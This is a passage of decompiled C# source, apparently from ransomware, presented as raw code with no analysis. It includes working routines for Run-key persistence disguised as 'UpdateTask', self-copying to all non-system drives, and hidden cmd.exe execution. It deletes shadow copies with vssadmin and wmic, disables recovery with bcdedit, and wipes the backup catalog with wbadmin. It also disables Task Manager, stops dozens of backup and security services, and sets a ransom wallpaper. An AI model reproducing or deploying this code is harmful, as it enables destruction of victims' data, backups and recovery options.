		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		if (location != text)
		{
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
		}
		if (File.Exists(path) && location == text)
		{
			return true;
		}
		return false;
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("UpdateTask", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != Path.GetPathRoot(Environment.SystemDirectory) && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void DisableTaskManager()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	private static void stopBackupServices()
	{
		//IL_018a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0190: Expected O, but got Unknown
		string[] array = new string[42]
		{
			"BackupExecAgentBrowser", "BackupExecDiveciMediaService", "BackupExecJobEngine", "BackupExecManagementService", "vss", "sql", "svc$", "memtas", "sophos", "veeam",
			"backup", "GxVss", "GxBlr", "GxFWD", "GxCVD", "GxCIMgr", "DefWatch", "ccEvtMgr", "SavRoam", "RTVscan",
			"QBFCService", "Intuit.QuickBooks.FCS", "YooBackup", "YooIT", "zhudongfangyu", "sophos", "stc_raw_agent", "VSNAPVSS", "QBCFMonitorService", "VeeamTransportSvc",
			"VeeamDeploymentService", "VeeamNFSSvc", "veeam", "PDVFSService", "BackupExecVSSProvider", "BackupExecAgentAccelerator", "BackupExecRPCService", "AcrSch2Svc", "AcronisAgent", "CASAD2DWebSvc",
			"CAARCUpdateSvc", "TeamViewer"
		};
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				ServiceController val = new ServiceController(text);
				val.Stop();
			}
			catch
			{
			}
		}
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
